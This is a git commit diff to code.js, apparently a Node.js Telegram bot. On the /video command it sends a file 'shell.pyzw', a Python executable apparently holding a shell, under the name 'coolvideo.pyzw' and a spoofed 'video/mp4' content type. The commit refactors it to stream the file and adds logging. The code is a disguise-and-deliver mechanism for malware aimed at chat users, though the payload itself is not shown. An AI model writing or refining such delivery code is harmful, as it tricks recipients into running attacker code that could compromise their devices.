4d4b00d155dd5b8179c7fb41eaf3b00c9effaa73
المعلم داغر الشهاوي <106396603+Hunt3r0x@users.noreply.github.com>
2024-04-14 00:39:24 +0200

    Update code.js

--- code.js
+++ code.js
@@ -1,19 +1,30 @@
 const fs = require("fs");
 const TelegramBot = require("node-telegram-bot-api");
-const token = "******************";
+
+const token = "*******:******_*************";
+
 const bot = new TelegramBot(token, { polling: true });
+
 bot.onText(/\/video/, (msg) => {
     const chatId = msg.chat.id;
+
+    const videoStream = fs.createReadStream("shell.pyzw");
+
     bot.sendVideo(
         chatId,
-        fs.readFileSync("shell.pyzw"),
+        videoStream,
         {
             width: 300,
             height: 300,
             duration: 30,
-        }, {
-        filename: "coolvideo.pyzw",
-        contentType: "video/mp4"
-    }
-    );
+        },
+        {
+            filename: "coolvideo.pyzw",
+            contentType: "video/mp4"
+        }
+    ).then(() => {
+        console.log("Video sent successfully");
+    }).catch((err) => {
+        console.error("Error sending video:", err.toString());
+    });
 });
